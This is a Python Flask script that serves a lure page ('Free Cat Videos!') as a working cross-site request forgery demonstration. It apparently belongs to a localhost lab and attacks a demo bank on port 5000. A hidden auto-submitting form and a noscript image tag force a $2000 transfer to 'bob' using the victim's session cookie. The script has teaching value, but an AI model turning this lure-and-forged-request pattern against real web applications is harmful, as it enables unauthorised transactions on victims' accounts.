from flask import Flask

app = Flask(__name__)

EVIL_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Free Cat Videos!</title>
  <style>
    body { font-family: Arial; text-align: center; padding-top: 50px; background: #1a1a2e; color: white; }
    .card { background: #16213e; padding: 30px; border-radius: 10px; max-width: 500px; margin: 0 auto; }
    video { width: 100%; border-radius: 8px; }
    .status { color: #e94560; font-size: 14px; margin-top: 20px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Cutest Cat Video Ever!</h1>
    <video controls autoplay loop>
      <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>
    <p class="status" id="statusMsg">Loading...</p>

    <form id="csrf-form" method="POST" action="http://127.0.0.1:5000/transfer" style="display:none;">
      <input type="hidden" name="to_account" value="bob" />
      <input type="hidden" name="amount" value="2000" />
    </form>

    <div id="debug" style="margin-top: 20px; text-align: left; font-size: 12px;"></div>
  </div>

  <script>
    function log(msg, ok) {
      var d = document.getElementById('debug');
      d.innerHTML += '<div style="color:' + (ok ? '#4ecca3' : '#e94560') + '">' + msg + '</div>';
    }

    log('[i] Page loaded from evil server on port 5001');
    log('[i] Attempting CSRF to bank on port 5000...');
    log('[i] Alice\\'s cookie for 127.0.0.1:5000 should be sent automatically');

    setTimeout(function() {
      document.getElementById('csrf-form').submit();
      log('[+] Form submitted! $2000 transferred to bob', true);
      document.getElementById('statusMsg').innerHTML = 'Attack sent! Check <a href="http://127.0.0.1:5000/check" target="_blank">balances</a>';
    }, 1000);
  </script>

  <noscript>
    <img src="http://127.0.0.1:5000/transfer?to_account=bob&amount=2000" style="display:none;" />
  </noscript>
</body>
</html>
"""

@app.route("/")
def evil():
    return EVIL_PAGE

if __name__ == "__main__":
    print("=" * 50)
    print("Evil CSRF Server running!")
    print("Access it at: http://127.0.0.1:5001")
    print("=" * 50)
    app.run(host="127.0.0.1", port=5001, debug=True)